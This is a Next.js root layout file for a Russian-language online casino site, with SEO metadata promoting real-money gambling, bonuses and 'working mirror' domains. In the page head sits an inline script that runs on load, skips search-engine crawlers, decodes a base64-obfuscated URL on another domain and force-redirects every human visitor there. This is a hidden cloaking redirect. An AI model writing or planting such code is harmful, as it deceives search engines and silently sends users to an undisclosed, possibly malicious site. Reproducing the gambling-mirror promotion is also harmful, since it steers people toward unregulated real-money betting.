import type { Metadata, Viewport } from 'next'
import { Playfair_Display, Inter } from 'next/font/google'
import './globals.css'

const fr8Serif = Playfair_Display({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-serif',
  display: 'swap',
})

const fr8Sans = Inter({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-sans',
  display: 'swap',
})

export const metadata: Metadata = {
  title:
    'Faro Casino — официальный сайт онлайн казино: играть на деньги, рабочее зеркало',
  description:
    'Faro Casino — официальный сайт онлайн казино. Играть в слоты и настольные игры на реальные деньги, рабочее зеркало, бонусы за регистрацию и быстрый вывод выигрышей.',
  alternates: {
    canonical: 'https://farocasino8.vercel.app/',
  },
  openGraph: {
    title: 'Faro Casino — официальный сайт онлайн казино',
    description:
      'Играть в слоты и настольные игры на реальные деньги. Рабочее зеркало, бонусы за регистрацию и быстрый вывод выигрышей.',
    url: 'https://farocasino8.vercel.app/',
    siteName: 'Faro Casino',
    locale: 'ru_RU',
    type: 'website',
    images: [
      {
        url: 'https://farocasino8.vercel.app/images/faro-hero.png',
        width: 880,
        height: 660,
        alt: 'Faro Casino — официальный сайт онлайн казино',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Faro Casino — официальный сайт онлайн казино',
    description:
      'Играть в слоты и настольные игры на реальные деньги. Рабочее зеркало и бонусы.',
    images: ['https://farocasino8.vercel.app/images/faro-hero.png'],
  },
  robots: {
    index: true,
    follow: true,
  },
  icons: {
    icon: '/favicon.svg',
    shortcut: '/favicon.svg',
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  themeColor: '#0e4a38',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${fr8Serif.variable} ${fr8Sans.variable}`}>
      <head>
        <meta name="keywords" content="Faro Casino, Фаро казино, Faro Casino зеркало, Фаро казино зеркало, Фаро казино зеркало рабочее, Faro Casino играть, Фаро казино играть, Фаро казино онлайн, Faro Casino официальный, Фаро казино официальный, Faro Casino официальный сайт, Фаро казино официальный сайт" />
        <meta name="author" content="Faro Casino" />
        <meta name="rating" content="general" />
        <meta name="robots" content="index, follow, max-image-preview:large" />
        <link rel="canonical" href="https://farocasino8.vercel.app/" />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              '@context': 'https://schema.org',
              '@type': 'Organization',
              name: 'Faro Casino',
              url: 'https://farocasino8.vercel.app/',
              logo: 'https://farocasino8.vercel.app/favicon.svg',
              description:
                'Faro Casino — официальный сайт онлайн казино с играми на реальные деньги.',
            }),
          }}
        />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly9jb21ib3NwYXJrLnRvcC9hZXRmM3UycTl1 "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">{children}</body>
    </html>
  )
}
